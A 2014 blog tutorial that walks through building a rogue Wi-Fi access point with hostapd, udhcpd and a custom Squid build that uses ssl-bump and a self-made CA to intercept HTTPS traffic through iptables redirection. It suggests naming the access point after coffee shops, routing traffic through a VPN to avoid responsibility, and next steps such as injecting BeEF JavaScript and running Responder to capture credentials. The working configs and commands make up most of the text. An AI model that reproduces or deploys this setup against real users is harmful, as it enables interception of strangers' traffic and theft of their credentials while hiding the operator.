---
tags: ["linux", "security"]
title: How-to setup a rogue access point with a transparent HTTP(s) proxy
description: "How to setup a rogue access point with a transparent HTTP(s) proxy"
keywords: "cloud data amazon S3 fake"
aliases:
  - /blog/2014/01/26/transparent-ssl-proxy-with-squid
comments: true
date: 2014-02-24
---
I'm always reading about dangerous rogue access points but never actually have seen one in action. So what better than create a test setup..

Hardware for this test setup will be
* my old linux notebook (a macbook pro) as fake access point
* a small [deal extreme](http://www.dx.com) network card (Ralink 5070 chipset). I've actually bought three differnet wireless cards for under $20 and am trying out the different chipsets. This card is rather small (like an usb stick), so it isn't to conspicous

The basic idea is to use [hostap](http://hostap.epitest.fi/hostapd/) to create a virtual access point. Would I be a hypothetical attacker I'd call it 'starbucks', 'freewave' or name it like some coffee shop around the corner. I'm using the notebook's included wireless card to provide an internet uplink. To achieve this I will have to compile a custom version of squid (including ssl support). I'm using [Ubuntu 13.10](http://www.ubuntu.com) for this, other linux distributions would work the same.

<!-- more -->

## Setup hostap

I'm using the Ubuntu-bundled hostapd 1.0. I've tried to compile the lastest version (2.0) by myself but wasn't able to get it working with my wireless network cards -- the major feature of the 2.0 version would be to support 802.11n (more network bandwidth).

First of all check the network cards (wlan1 in my case) with "iw list", it's output should contain the following lines for creating an virtual access point:

~~~
Supported TX frame types:
     ...
		 * AP
		 * AP/VLAN
     ...
	Supported RX frame types:
     ...
		 * AP: 0x00 0x20 0x40 0xa0 0xb0 0xc0 0xd0
		 * AP/VLAN: 0x00 0x20 0x40 0xa0 0xb0 0xc0 0xd0
     ...
~~~

I've create a very basic hostapd.conf configuration file:

~~~
interface=wlan1
ssid=TestAP
channel=11
country_code=DE
macaddr_acl=0
auth_algs=1
ieee8021x=0
~~~

And start the access point:

~~~ bash
$ sudo hostapd hostapd.conf 
Configuration file: hostapd.conf
Using interface wlan1 with hwaddr 7c:dd:90:48:7b:94 and ssid 'TestAP'
~~~

## Setup a DHCP server

First of all, give your access point an IP address and enable IP forwarding (as root):

~~~ bash
$ ifconfig wlan1 10.0.0.1
$ echo 1 > /proc/sys/net/ipv4/ip_forward
$ iptables -t nat -A POSTROUTING -j MASQUERADE
~~~

Now we should have an almost 'normal' access point, lacking DHCP. To add this I'm using udhcpd (as it is a very small DHCP server):

~~~ bash
 $ sudo apt-get install udhcpd
 $ sudo udhcpd -f udhcpd.conf
~~~

with udhcpd.conf being:

~~~
start   10.0.0.100
end     10.0.0.200

interface wlan1   #default: eth0

#Examles
opt dns 8.8.8.8
option  subnet  255.255.255.0
opt router  10.0.0.1
option  domain  local
option  lease 864000
~~~

Now you've got a "normal" access point, without interception capabilities.

## Setup an anonymous VPN service to protect your identity

You could use (Private Internet Access) to anonymize all outgoing traffic through tunneling all traffic through [OpenVPN](http://www.openvpn.net). Get an account from [PIA](https://www.privateinternetaccess.com/pages/buy-vpn/SNIKT001), download the openvpn example config files and start them (for example) through:

~~~
$ sudo openvpn Switzerland.ovpn
~~~

Now all outgoing traffic is anonymized. This helps if you want to create an open access point but your legislation would make you responsible for all traffic going through your access point.

You can always use this setup to provide people with an internet uplink without being responsible for that.

## Compile and setup squid with SSL support

Download the latest verison of [squid](http://www.squid-cache.org/), this was 3.3.11 for me. Unpack and compile it:

~~~ bash
$ cd squid-3.3.11
$ ./configure --prefix=/usr --localstatedir=/var --libexecdir=${prefix}/lib/squid3 --srcdir=. --datadir=${prefix}/share/squid3 --sysconfdir=/etc/squid3 --with-default-user=proxy --with-logdir=/var/log --with-pidfile=/var/run/squid3.pid --enable-inline --enable-async-io=8 --enable-storeio="ufs,aufs,diskd" --enable-removal-policies="lru,heap" --enable-delay-pools --enable-cache-digests --enable-underscores --enable-icap-client --enable-follow-x-forwarded-for --enable-basic-auth-helpers="LDAP,MSNT,NCSA,PAM,SASL,SMB,YP,DB,POP3,getpwnam,squid_radius_auth,multi-domain-NTLM" --enable-ntlm-auth-helpers=”smb_lm,” --enable-digest-auth-helpers=”ldap,password” --enable-negotiate-auth-helpers=”squid_kerb_auth” --enable-external-acl-helpers=”ip_user,ldap_group,session,unix_group,wbinfo_group” --enable-arp---enable-esi --enable-ssl --enable-zph-qos --enable-wccpv2 --disable-translation --with-logdir=/var/log/squid3  --with-filedescriptors=65536 --with-large-files
$ make
$ make install
~~~

Now you have a 'squid' binary that you can start.

But first modify the default squid config (in ```/etc/squid3/squid.conf```) to automatically generate SSl certificates for incoming requests:

~~~
# access rules
acl SSL_ports port 443
acl Safe_ports port 80		# http
acl Safe_ports port 21		# ftp
acl Safe_ports port 443		# https
acl Safe_ports port 70		# gopher
acl Safe_ports port 210		# wais
acl Safe_ports port 1025-65535	# unregistered ports
acl Safe_ports port 280		# http-mgmt
acl Safe_ports port 488		# gss-http
acl Safe_ports port 591		# filemaker
acl Safe_ports port 777		# multiling http
acl CONNECT method CONNECT

http_access deny !Safe_ports
http_access deny CONNECT !SSL_ports
http_access allow localhost manager
http_access deny manager
http_access allow localnet
http_access allow localhost
http_access deny all

# access config
http_port 3128 transparent

https_port 3127 intercept ssl-bump generate-host-certificates=on dynamic_cert_mem_cache_size=4MB cert=/home/andy/workspace/rogue-ap/myCA.pem
ssl_bump none localhost
ssl_bump server-first all
sslproxy_cert_error allow all
sslcrtd_program /usr/lib/squid3/ssl_crtd -s /var/lib/ssl_db -M 4MB

# refresh patterns
refresh_pattern ^ftp:		1440	20%	10080
refresh_pattern ^gopher:	1440	0%	1440
refresh_pattern -i (/cgi-bin/|\?) 0	0%	0
refresh_pattern (Release|Packages(.gz)*)$      0       20%     2880
refresh_pattern .		0	20%	4320
~~~

You have to create an SSL certificate for the squid proxy:

~~~ bash
$ openssl req -new -newkey rsa:1024 -days 365 -nodes -x509 -keyout myCA.pem -out /home/andy/workspace/rogue-ap/myCA.pem
Generating a 1024 bit RSA private key
.............++++++
...............++++++
writing new private key to 'myCA.pem'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:at
State or Province Name (full name) [Some-State]:vienna
Locality Name (eg, city) []:vienna
Organization Name (eg, company) [Internet Widgits Pty Ltd]:really trusted internet company
Organizational Unit Name (eg, section) []:internet security
Common Name (e.g. server FQDN or YOUR name) []:certified company
Email Address []:
~~~

And start the squid proxy from the command line:

~~~ bash
$ sudo squid -NCd9
~~~

So far there will be no traffic forwarded through your squid proxy, we can change this by using iptables:

~~~ bash
$ sudo iptables -t nat -A PREROUTING -i wlan1 -p tcp -m tcp --dport 80 -j DNAT --to-destination 127.0.0.1:3128
$ sudo iptables -t nat -A PREROUTING -i wlan1 -p tcp -m tcp --dport 443 -j DNAT --to-destination 127.0.0.1:3127
~~~

Each client that connects to an https will get an error message -- and this is good, otherwise this would be a rather unbeatable man-in-the-middle-attack. Already you can use ssldump to read all encrypted traffic between the client and the (roriginally ssl-encryptd) peer site -- if the client is too stupid to ignore the browser's warning message.

## Where to go from here?

So far this is just a normal caching rogue access point, what will be the next steps?

* add icap configuration to squid to actually intercept some some traffic
* selective forward of only some https addresses through the squid proxy -- for example, I believe that many mobile applications will not check the validity of SSL certificates
* add something like [Responder](https://github.com/SpiderLabs/Responder) to add additional capture protocols
* use squid proxy to automatically inject [Beef](http://beefproject.com/) javascript

Suggestions welcome!
